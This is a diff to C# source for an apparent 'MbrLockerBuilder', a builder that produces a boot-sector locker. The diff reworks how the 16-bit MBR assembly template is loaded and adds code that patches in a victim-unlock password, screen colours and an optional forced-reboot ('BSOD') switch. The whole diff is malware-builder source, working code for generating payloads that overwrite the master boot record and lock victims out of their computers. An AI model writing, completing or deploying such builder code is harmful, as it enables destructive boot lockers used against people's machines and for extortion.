@@ -572,6 +572,8 @@ namespace MbrLockerBuilder
 
         private string GenerateMBR()
         {
+            string template = null;
+
             try
             {
                 using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
@@ -580,18 +582,23 @@ namespace MbrLockerBuilder
                     {
                         using (StreamReader reader = new StreamReader(stream))
                         {
-                            return reader.ReadToEnd();
+                            template = reader.ReadToEnd();
                         }
                     }
                 }
             }
             catch { }
 
-            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
-            if (File.Exists(localPath))
-                return File.ReadAllText(localPath);
+            if (string.IsNullOrEmpty(template))
+            {
+                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
+                if (File.Exists(localPath))
+                    template = File.ReadAllText(localPath);
+            }
 
-            return @"
+            if (string.IsNullOrEmpty(template))
+            {
+                template = @"
 BITS 16
 ORG 0x7C00
 
@@ -822,6 +829,62 @@ password_ok:
 
 times 510 - ($ - $$) db 0
 dw 0xAA55";
+            }
+
+            // ============================================================
+            // ЗАМЕНА ПАРОЛЯ
+            // ============================================================
+            string password = this.txtPassword.Text.Trim();
+            if (string.IsNullOrEmpty(password)) password = "admin";
+
+            string passwordHex;
+            if (ContainsRussian(password))
+            {
+                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+            }
+            else
+            {
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+            }
+
+            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+
+            // ============================================================
+            // ЗАМЕНА ЦВЕТОВ
+            // ============================================================
+            string textColor = "0A";
+            switch (this.cmbTextColor.SelectedIndex)
+            {
+                case 0: textColor = "0A"; break;
+                case 1: textColor = "0C"; break;
+                case 2: textColor = "0F"; break;
+                case 3: textColor = "0B"; break;
+                case 4: textColor = "0E"; break;
+                case 5: textColor = "0D"; break;
+            }
+
+            string bgColor = "00";
+            switch (this.cmbBgColor.SelectedIndex)
+            {
+                case 0: bgColor = "00"; break;
+                case 1: bgColor = "10"; break;
+                case 2: bgColor = "40"; break;
+                case 3: bgColor = "20"; break;
+            }
+
+            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+            template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");
+
+            // BSOD
+            bool enableBSOD = this.chkBSOD.Checked;
+            if (enableBSOD)
+            {
+                template = template.Replace("jmp hang", "int 0x19");
+            }
+
+            return template;
         }
 
         private string GenerateStage2()
